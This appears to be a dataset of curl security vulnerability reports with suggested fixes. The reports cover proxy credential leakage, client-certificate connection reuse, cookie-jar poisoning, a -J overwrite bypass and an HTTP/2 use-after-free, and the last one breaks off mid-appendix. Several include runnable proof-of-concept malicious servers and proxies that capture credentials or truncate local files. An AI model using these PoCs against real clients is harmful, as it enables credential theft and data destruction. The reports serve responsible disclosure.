title: CVE-2026-86414: leaking host credentials to HTTP proxy
body:
Hi all,

I've found that found that an untrusted HTTP proxy can trick libcurl into sending the *origin's* credentials (Basic password, or a Negotiate/Kerberos ticket) to the proxy itself, by answering the `CONNECT` tunnel request with `401 WWW-Authenticate` instead of the expected `407 Proxy-Authenticate`. Yes, the dreaded and well-known, "malicious proxy".

## The bug

Both the H1 and H2/H3 CONNECT-response handlers decide whether a header applies to the proxy or the origin purely by status code:

```c
// lib/http_proxy.c:491-501 (Curl_http_proxy_inspect_tunnel_response, H2/H3)
if(resp->status == 401) {
    auth_reply = Curl_dynhds_cget(&resp->headers, "WWW-Authenticate");
}
else if(resp->status == 407) {
    auth_reply = Curl_dynhds_cget(&resp->headers, "Proxy-Authenticate");
}

if(auth_reply) {
    ...
    result = Curl_http_input_auth(data, resp->status == 407,
                                  auth_reply->value);
```

```c
// lib/cf-h1-proxy.c:396-406 (on_resp_header, H1)
if((checkprefix("WWW-Authenticate:", header) && (401 == k->httpcode)) ||
   (checkprefix("Proxy-authenticate:", header) && (407 == k->httpcode))) {

    bool proxy = (k->httpcode == 407);
    char *auth = Curl_copy_header_value(header);
    ...
    result = Curl_http_input_auth(data, proxy, auth);
```

Both call `Curl_http_input_auth(data, proxy, ...)` with `proxy = (status == 407)`. For a `401` — which is what our malicious proxy returns — `proxy` is `false`, and `Curl_http_input_auth` updates `data->state.authhost`, the *origin's* auth state, not the proxy's:

```c
// lib/http.c:1067
CURLcode Curl_http_input_auth(struct Curl_easy *data, bool proxy,
                              const char *auth)
{
  ...
  if(proxy) {
    availp = &data->info.proxyauthavail;
    authp = &data->state.authproxy;
  }
  else {
    availp = &data->info.httpauthavail;
    authp = &data->state.authhost;
  }
```

There is nothing anywhere in this call chain that knows "we are still inside CONNECT, talking to the proxy, not the origin." A `401`/`WWW-Authenticate` at this point is entirely proxy-controlled input, but it is processed exactly as if it came from the real origin server.

Once `authhost.picked` is set this way (e.g. to `CURLAUTH_BASIC`), curl retries the `CONNECT` request, and `output_auth_headers()` — which decides what to attach to *any* request, including the CONNECT itself — has no check preventing it from firing before the tunnel exists:

```c
// lib/http.c: output_auth_headers(), Basic branch
if(authstatus->picked == CURLAUTH_BASIC) {
    if(
       (proxy && conn->http_proxy.creds && ...) ||
       (!proxy && data->state.creds &&
        Curl_creds_has_user_or_pass(data->state.creds) &&
        !Curl_checkheaders(data, STRCONST("Authorization")))) {
      auth = "Basic";
      result = http_output_basic(data, conn, proxy);
```

`proxy=false` here means it emits a plain `Authorization: Basic <origin creds>` header – not `Proxy-Authorization` – directly on the `CONNECT` line sent to the proxy. For Negotiate, the same poisoning makes `auth_spnego()` set `data->req.newurl`, which triggers a CONNECT retry that computes and sends a real Kerberos service ticket for the *origin* to the proxy instead.

## Impact

Any proxy an application is configured to route through (`CURLOPT_PROXY`) can harvest the origin credentials (`CURLOPT_USERPWD`, or a Kerberos ticket) that were only ever meant to reach the origin server, simply by answering the tunnel setup with a `401` instead of a `407`. This works even when the caller uses `--anyauth`/`CURLAUTH_ANY` specifically to avoid sending credentials until challenged — the proxy manufactures the challenge itself, on behalf of a host it doesn't own.

Preconditions: `CURLOPT_PROXY` configured, origin credentials set (`data->state.creds` non-NULL), `CURLOPT_HTTPAUTH` includes a method the proxy can advertise (Basic is enough), and `CURL_DISABLE_PROXY`/`CURL_DISABLE_HTTP` off (both default off).

## PoC

Malicious proxy: on the first `CONNECT`, replies `401 WWW-Authenticate: Basic` instead of tunneling; on the retry, establishes the tunnel and records whatever cleartext request curl sends through it.

```sh
#!/bin/sh
# Reproduction: untrusted HTTP proxy poisons ORIGIN auth state (data->state.authhost)
# by answering a CONNECT tunnel request with "401 WWW-Authenticate: Basic".
# The shipped libcurl then preemptively sends the operator-configured ORIGIN
# credentials over the cleartext proxy tunnel, where the proxy reads them --
# even though --anyauth normally withholds credentials until challenged.
#
# Env overrides (sensible defaults for the build container):
#   VF_PORT    - loopback port for the malicious proxy   (default 8991)
#   VF_MARKER  - marker path the proxy creates on leak    (default /tmp/vf-cred-leak)
set -e
MODE="$1"
PORT="${VF_PORT:-8991}"
MARKER="${VF_MARKER:-/tmp/vf-cred-leak}"
WORK="$(mktemp -d)"

# --- setup (runs in both arms; must not depend on MODE for its EFFECT) ---
rm -f "$MARKER"

cat > "$WORK/proxy.py" <<'PY'
import socket, sys, os
MODE=sys.argv[1]; PORT=int(sys.argv[2]); MARKER=sys.argv[3]
srv=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
srv.bind(("127.0.0.1",PORT)); srv.listen(1)
sys.stdout.write("LISTENING\n"); sys.stdout.flush()
def rd(c):
    d=b""; c.settimeout(5)
    try:
        while b"\r\n\r\n" not in d:
            ch=c.recv(4096)
            if not ch: break
            d+=ch
    except Exception: pass
    return d
try:
    srv.settimeout(15)
    c,_=srv.accept()
    rd(c)  # CONNECT #1
    if MODE=="exploit":
        # attack: answer CONNECT with an ORIGIN 401 challenge, poisoning authhost
        c.sendall(b"HTTP/1.1 401 Unauthorized\r\n"
                  b'WWW-Authenticate: Basic realm="o"\r\n'
                  b"Content-Length: 0\r\n\r\n")
        rd(c)  # CONNECT retry
    # control: benign proxy, no 401 poisoning
    c.sendall(b"HTTP/1.1 200 Connection established\r\n\r\n")
    tun=rd(c)  # the cleartext tunneled ORIGIN request, produced by shipped curl
    # Marker creation depends ONLY on what shipped curl transmitted, identically
    # in both arms -- the harness stats the file itself.
    if b"\r\nAuthorization: Basic " in tun or tun.startswith(b"Authorization: Basic "):
        open(MARKER,"w").write("origin credential observed by proxy\n")
    try:
        c.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nhi")
        c.close()
    except Exception: pass
except Exception as e:
    sys.stderr.write("proxy error: %r\n"%(e,))
PY

# start the malicious proxy and wait until it is listening
python3 "$WORK/proxy.py" "$MODE" "$PORT" "$MARKER" > "$WORK/proxy.out" 2>&1 &
PXPID=$!
i=0
while [ $i -lt 50 ]; do
  grep -q LISTENING "$WORK/proxy.out" 2>/dev/null && break
  i=$((i+1)); sleep 0.1
done
grep -q LISTENING "$WORK/proxy.out" || { echo "proxy failed to start"; cat "$WORK/proxy.out"; exit 1; }

# everything is up and the shipped runtime is about to be exercised
: > "${VF_READY:-/dev/null}"

# --- exercise the shipped curl exactly once ---
# -p/--proxytunnel forces CONNECT even for an http:// origin, so the origin
# request travels through the proxy-controlled cleartext tunnel.
# --anyauth means curl should NOT send credentials until challenged BY THE ORIGIN.
timeout 30 curl -s -o /dev/null \
    -x "http://127.0.0.1:${PORT}" -p \
    -u SECRETUSER:SECRETPASS --anyauth \
    "http://origin.test/path" || true

wait "$PXPID" 2>/dev/null || true
echo "=== proxy log ($MODE) ==="; cat "$WORK/proxy.out"
echo "=== marker present? ==="; ls -l "$MARKER" 2>/dev/null && echo "MARKER EXISTS" || echo "no marker"
```

We run it with `sh ./reproduce.sh exploit`. Result: on the exploit run, the marker file appears — the proxy observed `Authorization: Basic` on the tunneled request:

```
=== proxy log (exploit) ===
LISTENING
=== marker present? ===
-rw-r--r-- 1 root root 36 Sep  2 11:34 /tmp/vf-cred-leak
MARKER EXISTS
```

On the control run (`sh ./reproduce.sh control`)  (proxy replies `200 Connection established` immediately, no `401`), the marker never appears — no `Authorization` header is sent, exactly as `--anyauth` promises. Same client flags, same origin, the only variable is whether the proxy injects a `401` during `CONNECT`.

## Where it came from

The root cause is since [`52ceab5e41`](https://github.com/curl/curl/commit/52ceab5e41a01b4d1227876d51a3680a3ce5a841) (2003-09-03, "Re-arranged code to make the proxy-CONNECT loop able to do some of the authentication negotiations needed for NTLM, Digest etc."), the CONNECT-tunnel response parser has shared the same `401 → WWW-Authenticate → origin auth state` logic used for real origin responses, distinguishing proxy vs. origin purely by status code (`401` vs `407`) rather than by *why* the response was received. Every later rewrite of the proxy-tunnel code (the 2016 `http_proxy.c` restructure, the 2022–2023 connection-filters split into `cf-h1-proxy.c`/`cf-h2-proxy.c`, and this year's HTTP/3 CONNECT/MASQUE support in `http_proxy.c`) carried the same status-code-only logic forward unchanged. It's present at current `main` ([`38703fe2`](https://github.com/curl/curl/commit/38703fe2610bf6e79390bfc93a8558ffc0e2b02c), 2026-09-02).

## Suggested direction

While a `CONNECT` tunnel is being negotiated, a `401`/`WWW-Authenticate` from the proxy should either be ignored or treated as proxy-scoped, never routed into `data->state.authhost`. Concretely: pass an explicit "we are tunneling, not talking to the origin yet" flag into `Curl_http_input_auth()` (or refuse to call it at all for `401` during CONNECT), and make sure `authhost` state can't leak into a CONNECT retry's `Authorization` header before the tunnel is actually established.

Cheers,
Josh

## Impact

Origin credentials may be leaked to proxy.
label: real

cve.summary: leaking host credentials to HTTP proxy

title: CVE-2026-86415: auto client cert connection reuse mixup
body:
Howdy,

libcurl's connection-cache matcher never checks `auto_client_cert`, so a cached, already-authenticated Schannel connection can be handed to a transfer that just got redirected to a different origin, even though the code explicitly computed `auto_client_cert = FALSE` for that transfer to prevent exactly this.

## The bug

`Curl_ssl_easy_config_complete()` recomputes the effective SSL config for every request, including a request that is the result of following a `Location:` redirect. Part of that is deciding whether the automatically-selected client certificate applies:

```c
// lib/vtls/vtls_config.c:236-238
sslc->auto_client_cert = Curl_peer_equal(origin, initial_origin) &&
                         !!(options & CURLSSLOPT_AUTO_CLIENT_CERT);
```

`initial_origin` is the origin of the very first URL of the `curl_easy_perform()`, set once and kept for the whole redirect chain. So the moment a redirect takes the transfer to a different host, `auto_client_cert` is correctly forced to `FALSE` — the client shouldn't auto-present a certificate to a host it wasn't explicitly pointed at.

The problem is that this flag lives in `struct ssl_config_data`, not in `struct ssl_primary_config`:

```c
// lib/vtls/vtls_config.h:74-75
BIT(auto_client_cert);   /* automatically locate and use a client
                            certificate for authentication (Schannel) */
```

and connections in the pool only ever retain the primary struct:

```c
// lib/urldata.h:322
struct ssl_primary_config ssl_config;
```

Connection reuse is decided by `match_ssl_primary_config()`, which takes two `ssl_primary_config *` and therefore has no way to see `auto_client_cert` even in principle:

```c
// lib/vtls/vtls_config.c:136-146
static bool match_ssl_primary_config(struct Curl_easy *data,
                                     struct ssl_primary_config *c1,
                                     struct ssl_primary_config *c2)
{
  (void)data;
  if((c1->version == c2->version) &&
     (c1->version_max == c2->version_max) &&
     (c1->ssl_options == c2->ssl_options) &&
     (c1->native_ca_store == c2->native_ca_store) &&
     (c1->verifypeer == c2->verifypeer) &&
     (c1->verifyhost == c2->verifyhost) &&
```

`ssl_options` (the raw `CURLOPT_SSL_OPTIONS` bitmask, including the `CURLSSLOPT_AUTO_CLIENT_CERT` bit) is identical on every request from the same easy handle, so it always matches. The derived, per-request `auto_client_cert` boolean that actually encodes "is this okay for the current origin" is simply never consulted during cache lookup.

So: if the connection pool already holds a live connection to host B that was established directly (B == that transfer's initial origin, `auto_client_cert` was `TRUE`, client cert was presented at handshake time), and a later request to attacker-controlled host A gets redirected to B, the redirected request reuses that cached, already-authenticated connection instead of opening a fresh one. No new handshake happens, so the `auto_client_cert = FALSE` just computed for the redirected request never gets a chance to matter — the request rides straight over on B's existing authenticated session, on a path chosen by A's `Location:` header:

```c
// lib/http.c:3414-3439 (http_header_l)
if(HD_IS(hd, hdlen, "Location:")) {
    ...
    data->req.location = location;
    if((k->httpcode >= 300 && k->httpcode < 400) &&
       data->set.http_follow_mode) {
      ...
      data->req.newurl = curlx_strdup(data->req.location); /* clone */
```

This is Schannel-specific: `auto_client_cert` is read in exactly one place outside `vtls_config.c`:

```c
// lib/vtls/schannel.c:783-786
if(!ssl_config->auto_client_cert) {
    flags &= ~(DWORD)SCH_CRED_USE_DEFAULT_CREDS;
    flags |= SCH_CRED_NO_DEFAULT_CREDS;
    infof(data, "schannel: disabled automatic use of client certificate");
```

(also used to set `ISC_REQ_USE_SUPPLIED_CREDS` at `lib/vtls/schannel.c:981`). No other TLS backend reads the field, so on OpenSSL/GnuTLS/etc. `CURLSSLOPT_AUTO_CLIENT_CERT` has no effect at all and this bug is inert there.

## Where it came from

Introduced by [`d69bfad3fa3daf5e72331f6870667607828d5891`](https://github.com/curl/curl/commit/d69bfad3fa3daf5e72331f6870667607828d5891) — "ssl native_ca_store: always reinit" (2026-06-08). Before this commit, `auto_client_cert` was set once, unconditionally, from the raw `CURLOPT_SSL_OPTIONS` bit (in `setopt.c`) — there was no origin-scoping at all. This commit added the `ssl_easy_config_compl_options()` helper and, with it, the `Curl_peer_equal(origin, initial_origin)` gate that first made `auto_client_cert` redirect-aware — but never touched `match_ssl_primary_config()`, so the new protection was incomplete from the moment it was introduced. Still present at current `main` ([`38703fe2`](https://github.com/curl/curl/commit/38703fe2610bf6e79390bfc93a8558ffc0e2b02c), 2026-09-02).

## Suggested direction

Either fold `auto_client_cert` into `ssl_primary_config` so `match_ssl_primary_config()` can compare it directly, or have `Curl_ssl_conn_config_match()` reject the match when the needle's `auto_client_cert` is `FALSE` but the candidate connection was established with it `TRUE`.

Cheers,
Josh

## Impact

A remote server (A) that a libcurl-based client follows redirects from can cause an existing, auto-authenticated (client-certificate) Schannel connection to a second host (B) to be reused for a request whose path/target A controls, provided the client already holds a live connection to B that it opened directly (not via redirect) with `CURLSSLOPT_AUTO_CLIENT_CERT` set. The client certificate is never sent to A — it stays with B, which already had it — but A gets to steer an authenticated request against B's endpoints without B (or the application) ever intending that redirect chain to be authenticated. This is exactly the scenario the `auto_client_cert`/`initial_origin` check was written to prevent.

Preconditions: Windows/Schannel backend, `CURLSSLOPT_AUTO_CLIENT_CERT` set via `CURLOPT_SSL_OPTIONS`, redirects followed, and a connection pool that still holds a live, directly-established connection to the redirect target.
label: real

title: CVE-2026-92386: server-set cookie aborts cookie jar load
body:
Hi all,

I found a way for a remote server to poison a shared cookie jar so that later, unrelated transfers fail before any network I/O happens. It just has to send a Set-Cookie that curl happily accepts but can never read back from its own jar file.

## The bug

`parse_cookie_header()` accepts a Set-Cookie line up to `MAX_COOKIE_LINE` (5000) bytes. `parse_first_pair()` separately permits a name and value totaling 4096 bytes. Those two limits are independent, so a value can be crafted to land right at the edge of both.

For example: on `https://a.co/`, `n=` followed by a 4095-byte value and `; Path=/` followed by 895 more path bytes comes to exactly 5000 bytes total, exactly 4096 for name+value, with a valid 896-byte path. It sails through both checks.

The problem shows up on the write side. `get_netscape_format()` serializes domain, six tabs, tailmatch, path, secure flag, expiry, name, and value with no check on the resulting total length. That example alone produces at least 5013 physical bytes on disk including the newline — already past the 5000-byte ceiling the *reload* path enforces.

On reload, the line dynbuf is initialized with `MAX_COOKIE_LINE`, and `Curl_get_line()` calls `dyn_nappend()`:

```c
// lib/cookie.c:1184-1186
struct dynbuf buf;
Curl_dyn_init(&buf, MAX_COOKIE_LINE);
while(Curl_get_line(&buf, fp)) {
```

`dyn_nappend()` counts the terminating NUL against that bound, so it accepts at most 4999 physical bytes and returns `CURLE_TOO_LARGE` for any jar line at or beyond that. A record that was perfectly valid to accept and write is not valid to read back: the same limit gets applied inconsistently on the two sides of a round trip.

Cookie loading stops dead at that error, and `Curl_pretransfer()` propagates it before any network I/O starts.

It gets worse: newly received cookies get increasing creation times, and `cookie_output()` sorts newest-first. So the attacker's oversized record can end up ahead of older, legitimate entries in the file. As soon as it's written, one origin has poisoned a jar shared across unrelated destinations: every subsequent transfer that loads that jar fails immediately, until someone finds and removes the bad line or deletes the file.

## PoC

Tested against the audit revision `e5e1c356107ea4f8208757deb69776d94496cfae`.

```sh
#!/usr/bin/env bash
set -eu

CURL_BIN=${CURL_BIN:-"$(pwd)/build-poc/src/curl"}
test -x "$CURL_BIN" || {
  echo "missing executable: $CURL_BIN" >&2
  exit 2
}

td=$(mktemp -d)
trap 'kill "$server_pid" 2>/dev/null || true; wait "$server_pid" 2>/dev/null || true; rm -rf "$td"' EXIT INT TERM

cat >"$td/server.py" <<'PY'
#!/usr/bin/env python3
import http.server
import sys

# 4095-byte value + one-byte name = 4096 name/value bytes.
# The total Set-Cookie value is 4997 bytes, within curl's input limit.
cookie = "n=" + "A" * 4095 + "; Path=/" + "B" * 892

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        with open(sys.argv[1], "a") as f:
            f.write("request\n")
        self.send_response(200)
        if self.path == "/set":
            self.send_header("Set-Cookie", cookie)
        self.send_header("Content-Length", "2")
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, *_):
        pass

server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
print(server.server_address[1], flush=True)
server.serve_forever()
PY

requests="$td/requests"
python3 "$td/server.py" "$requests" >"$td/port" 2>"$td/server.err" &
server_pid=$!
for _ in $(seq 1 100); do
  test -s "$td/port" && break
  sleep 0.01
done
port=$(head -n 1 "$td/port")
test -n "$port" || { echo "server did not start" >&2; exit 1; }

jar="$td/cookies.txt"
"$CURL_BIN" --silent --show-error --cookie-jar "$jar" \
  "http://127.0.0.1:$port/set" -o /dev/null

line=$(awk 'BEGIN { n=0 } !/^#/ && length($0)>n { n=length($0) } END { print n }' "$jar")
printf 'serialized_cookie_line=%s bytes\n' "$line"
test "$line" -gt 5000 || { echo "jar line was not oversized" >&2; exit 1; }

before=$(wc -l <"$requests")
set +e
error=$("$CURL_BIN" --silent --show-error --cookie "$jar" \
  "http://127.0.0.1:$port/check" -o /dev/null 2>&1)
status=$?
set -e
after=$(wc -l <"$requests")

printf 'reload_exit=%s\nrequests_before=%s\nrequests_after=%s\n' \
  "$status" "$before" "$after"
printf '%s\n' "$error"

if test "$status" -ne 0 && test "$after" -eq "$before"; then
  echo "RESULT: generated cookie jar is unloadable; reload failed before network I/O"
else
  echo "RESULT: claim not reproduced"
  exit 1
fi
```

Running this: curl writes the jar from the `/set` response, and the resulting line measures over 5000 bytes (`serialized_cookie_line=... bytes`, `> 5000` as asserted). The very next invocation, pointed at the same jar for an unrelated request to `/check`, fails before it ever reaches the network (`requests_after` equals `requests_before`: no second request was made).

The jar that curl itself wrote is a jar curl itself can no longer load.

## Suggested direction

Use one size contract across cookie acceptance, Netscape serialization, and reload. Before accepting or writing a cookie, calculate the complete physical record, separators, newline, and terminating NUL included, and reject anything that couldn't be reloaded. Alternatively, raise the loader bound to cover the maximum valid serialized record, and make an oversized persisted line skippable rather than aborting the entire load.

Cheers,
Josh

## Impact

Any HTTPS server a victim's client talks to, while cookie-jar persistence is enabled, can plant a record in a shared jar that renders it unloadable. That breaks every later transfer using that jar, including ones to origins that never interacted with the attacker, until the jar is found and repaired or deleted.

Preconditions:
- `--cookie-jar`/`CURLOPT_COOKIEJAR` persistence enabled
- a server willing to send an oversized-but-accepted Set-Cookie header
label: real

title: CVE-2026-92390: -J no-clobber guarantee bypassed with 103 early hints
body:
Hi all,

I found a way for a server to defeat `--remote-header-name`'s (`-J`) no-clobber guarantee: with `curl -O -J -i`, sending a `103 Early Hints` before the final response (or an `ETag` ahead of `Content-Disposition` under `--etag-save`) lets a server overwrite an existing file it names via `Content-Disposition`, even though `-J` documents that exact case as protected.

This is a post-CVE-2020-8177 variant of the same `-J` plus `-i` header-overwrite class. The earlier flaw was fixed in curl 7.71.0; this case reaches the same unsafe state through informational-response and `--etag-save` header ordering after support for combining `-J` with displayed headers was added.

## Why it happens

`-J` promises not to overwrite an existing server-selected filename ([documented here](https://curl.se/docs/manpage.html#--remote-header-name)). Curl waits for a usable `Content-Disposition` header, or the 8.19.0 redirect `Location` fallback, before applying that check.

With `-i`, curl normally buffers displayed headers while it waits for the filename. However, the displayed-header path still opens the output file for an HTTP 1xx response such as `103 Early Hints`. The same happens for an `ETag` line when `--etag-save` handles it before `Content-Disposition`. That early open uses the normal truncating mode on the URL-derived filename.

When the final `Content-Disposition` arrives, curl sees that the output stream is already open and aborts. The protected no-clobber open is never reached, but the URL-derived file has already been truncated. If the URL is `.../victim.txt` and the server names `victim.txt`, this is the exact file that `-J` promises to protect.

This also matches RFC 8297's requirement that Early Hints must not affect final-response processing. See [RFC 8297](https://datatracker.ietf.org/doc/rfc8297/).

## PoC

Server sends `103 Early Hints`, then a final response whose `Content-Disposition` filename is identical to the URL basename and to a pre-existing local file. Control: same server, same file, no `103`.

```sh
#!/bin/sh
# Reproduces AISLE-2026-0115-00244: curl -O -J -i lets a server's 103 Early
# Hints defeat -J's O_EXCL no-clobber protection when Content-Disposition
# names the same file as the URL basename.
set -e
MODE="$1"   # exploit (103 first) | control (no 103)
PORT="${VF_PORT:-18080}"
WORK="${VF_WORK:-/tmp/vf-j-noclob}"
mkdir -p "$WORK"; cd "$WORK"
printf 'ORIGINAL-VICTIM-CONTENT-DO-NOT-DELETE\n' > victim.txt

python3 -c "
import socket, time
mode = '$MODE'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('127.0.0.1', $PORT)); s.listen(1)
c, _ = s.accept()
c.recv(65536)
if mode == 'exploit':
    c.sendall(b'HTTP/1.1 103 Early Hints\r\n\r\n')
    time.sleep(0.1)
body = b'ATTACKER-CONTROLLED-BODY\n'
# Content-Disposition filename matches the URL basename on purpose.
c.sendall(b'HTTP/1.1 200 OK\r\nContent-Disposition: attachment; filename=\"victim.txt\"\r\n'
          b'Content-Length: ' + str(len(body)).encode() + b'\r\n\r\n' + body)
" &
sleep 0.3

rc=0
curl -sS -O -J -i "http://127.0.0.1:$PORT/victim.txt" || rc=$?
wait
echo "mode=$MODE rc=$rc victim=[$(cat victim.txt)]"
```

Measured with the local `curl 8.22.1-DEV` build; the same relevant code is present at `curl-8_22_0`:

```
mode=control rc=23 victim=[ORIGINAL-VICTIM-CONTENT-DO-NOT-DELETE]
mode=exploit rc=23 victim=[HTTP/1.1 103 Early Hints
]
```

Same server-chosen filename, same pre-existing file, same final response — the only difference is the `103` arriving first. `control` shows the guarantee working: curl refuses to touch `victim.txt` and exits with an error. `exploit` shows it defeated: the file is truncated and replaced with header text before curl ever gets to the check that was supposed to protect it. `--no-clobber` preserves the original file in both cases, although it may create a numbered sibling such as `victim.txt.1` and the transfer still exits with error 23, so it is a working mitigation in the meantime.

## Suggested direction

Header display needs to be held back the same way `Content-Disposition` parsing already is, for as long as `honor_cd_filename` is active: buffer displayed headers from informational responses and the `--etag-save` `ETag` line until the filename decision is final, then open exactly one path with its correct clobber mode. The implementation must continue to parse filename-bearing headers only from the applicable 2xx/3xx response block; RFC 8297 states that 103 headers must not affect final-response processing. A regression test wants a `103` (or an `ETag`-before-`Content-Disposition` response under `--etag-save`) naming the same file as the URL basename, asserting the pre-existing file survives. See [RFC 8297](https://datatracker.ietf.org/doc/rfc8297/).

Preconditions: curl's command-line tool invoked with `-O -J -i`, default clobber mode, an HTTP server able to send an informational response or an early `ETag` before its applicable `Content-Disposition`, and a pre-existing local file matching the name the server chooses.

Cheers,  
Josh

## Impact

A server a user runs `curl -O -J -i` against can destroy a specific existing local file: it picks a `Content-Disposition` filename matching the URL basename (or the fallback filename extracted from a redirect target when `-L` is used) and precedes the applicable response with a `103` or an early `ETag`. This defeats a guarantee `-J` documents explicitly, not just the ordinary `-O` overwrite behavior.
label: real

title: CVE-2026-92392: HTTP/2 upload Use-After-Free
body:
## Summary:
During a file upload, curl mishandles HTTP/2 RST_STREAM received from the server (with reason HTTP_1_1_REQUIRED or REFUSED_STREAM) leading to a use after free of a `struct Curl_easy` object. The control flow is a bit complicated, so I've produced an ASCII tree of the control flow to highlight the object lifetime issue in the Appendix below.

Preconditions for this are `curl -T <file>`, where `<file>` contains anywhere "<word> <word> <any>\n\n" and exceeds ~135KB. Our PoC exploit also requires `-Z`/`--parallel` when PIE/ASLR is enabled, but this is not necessary to trigger the memory corruption, only for exploitation.

As for how the UAF happens, after receiving the reset, multi.c converts the reset into a retry and calls `multi_done()`. In `multi_done()`, it calls `Curl_conn_ev_data_done()` which makes curl forget about the transfer, then it calls `Curl_req_done()`. Then `Curl_req_done()` flushes the buffered unsent remainder of the upload body into the connection. Since curl no longer knows about the transfer, it treats those bytes as a new request.  If they look like a request line, `h2_submit()` opens a new stream that stores a pointer to the `Curl_easy` object. This is the pointer that will be UAFed. After the retry completes, the application frees the `Curl_easy` object, but the connection still holds the pointer. It is dereferenced when the server sends a frame on that stream which can happen at exit, when the connection pool is destroyed.

## Affected version
8.22.0

## Steps To Reproduce:
I've attached a malicious server that triggers the bug (`evil-server.py`)

```bash
wget 'https://curl.se/download/curl-8.22.0.tar.gz'
sha1sum curl-8.22.0.tar.gz # should be 284e444b67f676a281906cfc86e9672780555cd4
tar xf curl-8.22.0.tar.gz
mkdir build ; cd build
# build with ASAN enabled
CC=clang CFLAGS="-O2 -g -fsanitize=address"" LDFLAGS="-Wl,-rpath,/opt/curl-release/lib" \
    ../curl-8.22.0/configure --prefix=/opt/curl-release \
      --enable-static --enable-shared --disable-docs --disable-manual \
      --with-openssl --with-zlib --with-brotli --with-zstd --with-libidn2 \
      --with-nghttp2 --with-libpsl --with-libssh2 --with-gssapi \
      --enable-ldap --enable-ldaps --enable-websockets --enable-mqtt --enable-ipfs \
      --enable-ntlm --enable-smb --enable-httpsig --enable-httpsrr --enable-ssls-export \
    && make -j"$(nproc)"
# make an example file for uploading that satisfies the conditions for the UAF
cat ../docs/*.md > sample_docs.md
# start the malicious server, see attached evil-server.py
 python3 evil-server.py &
# we use --insecure because the server's cert is self signed, not necessary to trigger the bug.
# This should result in an ASAN UAF crash
./src/curl --insecure -T ./sample_docs.md https://127.0.0.1:19170/x
```

I've also attached a .tar.gz that contains scripts to build a Docker container where you can reproduce the RCE.

It also contains a suggested patch (basically, call `Curl_req_abort_sending()` when retrying the connection to discard unsent request content).

## Appendix

```
PHASE 1: upload starts
Curl_req_send()                                 request.c:380    request head + first body bytes -> req.sendbuf
└─ req_flush() -> ... -> cf_h2_send()           http2.c:2197     no stream yet
   └─ h2_submit()                               http2.c:2062
      ├─ http2_data_setup()                     http2.c:361      streams[mid] created
      └─ nghttp2_submit_request(..., data)      http2.c:2133     stream 1 -> data      <- pointer #1 stored

PHASE 2: upload stalls (server can do this by not granting flow-control window)
multistate_performing() -> Curl_sendrecv()      multi.c:2029 -> transfer.c:354
└─ sendrecv_ul() -> Curl_req_send_more()        transfer.c:340 -> request.c:458
   ├─ add_from_client()                         request.c:351    read file -> req.sendbuf (64 KB)
   └─ req_flush() -> ... -> cf_h2_send()        http2.c:2197
      └─ cf_h2_body_send()                                       -> stream->sendbuf
         └─ req_body_read_callback()            http2.c:1577     window is 0 -> NGHTTP2_ERR_DEFERRED (:1625)
   => stream->sendbuf full, req.sendbuf full, nothing moves      <- leftover bytes now parked in req.sendbuf

PHASE 3: server sends HEADERS(200) + RST_STREAM(HTTP_1_1_REQUIRED)
multistate_performing()                         multi.c:2029
├─ result = Curl_sendrecv()                     multi.c:2043 -> transfer.c:354
│  └─ sendrecv_dl()                             transfer.c:220
│     ├─ result = xfer_recv_resp()              transfer.c:269
│     │  └─ ... cf_h2_recv()                    http2.c:1941
│     │     ├─ result = stream_recv()           http2.c:1967     nothing yet -> AGAIN
│     │     ├─ h2_progress_ingress()            http2.c:1972 -> 1865
│     │     │  └─ h2_process_pending_input()    http2.c:487
│     │     │     └─ nghttp2_session_mem_recv()                  parses RST_STREAM
│     │     │        └─ on_stream_close()       http2.c:1298
│     │     │           ├─ stream->closed = TRUE      http2.c:1333   error=0xd, reset=TRUE
│     │     │           └─ set_stream_user_data(0)    http2.c:1346   stream 1 pointer cleared
│     │     └─ result = stream_recv()           http2.c:1976
│     │        └─ result = http2_handle_stream_close()   http2.c:1850 -> 1683   = CURLE_HTTP2_STREAM
│     ├─ if(result != CURLE_AGAIN) goto out;    transfer.c:272   <- error exit
│     │     ...skipped...
│     │     Curl_req_abort_sending(data)        transfer.c:327   never reached -> req.sendbuf NOT emptied
│     └─ out: return result                     transfer.c:330   = CURLE_HTTP2_STREAM
│
├─ if(result == CURLE_HTTP2_STREAM && Curl_h2_http_1_1_error())   multi.c:2064
│     retry = TRUE; result = CURLE_OK           multi.c:2087-2088
├─ follow = FOLLOW_RETRY                        multi.c:2129
│
│  PHASE 4: wrap-up
├─ multi_done(data, CURLE_OK, premature=FALSE)  multi.c:2130
│  ├─ Curl_http_done()
│  ├─ Curl_conn_ev_data_done()                  multi.c:749 -> cfilters.c:982 --- **for maintainers: should this happen after Curl_req_done?**
│  │  └─ cf_cntrl_all(CF_CTRL_DATA_DONE)        cfilters.c:448
│  │     └─ cf_h2_cntrl()                       http2.c:2642
│  │        └─ http2_data_done()                http2.c:416
│  │           ├─ set_stream_user_data(NULL)    http2.c:428
│  │           └─ hash_remove(streams, mid)     http2.c:447      <- filter forgets this transfer
│  ├─ result = Curl_req_done(aborted=FALSE)     multi.c:754 -> request.c:102
│  │  └─ req_flush()                            request.c:298    req.sendbuf not empty
│  │     └─ req_send_buffer_flush()             request.c:243
│  │        └─ xfer_send()                      request.c:186
│  │           └─ Curl_xfer_send()              transfer.c:806
│  │              └─ Curl_conn_send()           cfilters.c:1073
│  │                 └─ cf_h2_send()            http2.c:2197     stream == NULL -> "new request"
│  │                    └─ h2_submit()          http2.c:2062
│  │                       ├─ http2_data_setup()          http2.c:361    streams[mid] re-created
│  │                       ├─ Curl_h1_req_parse_read()    http1.c:262    planted bytes parse as "T /path x"
│  │                       └─ stream_id = nghttp2_submit_request(..., data)  http2.c:2133   stream 3 -> data   <- pointer #2 stored
│  └─ multi_done_locked()                       multi.c:756 -> 632
│     ├─ Curl_detach_connection()                                data->conn = NULL, state.done = TRUE
│     └─ Curl_cpool_conn_now_idle()                              conn back in pool, stream 3 still -> data
└─ result = multi_follow(FOLLOW_RETRY)          multi.c:2132     retry on a new HTTP/1.1 connection

PHASE 5: retry finishes, handle freed
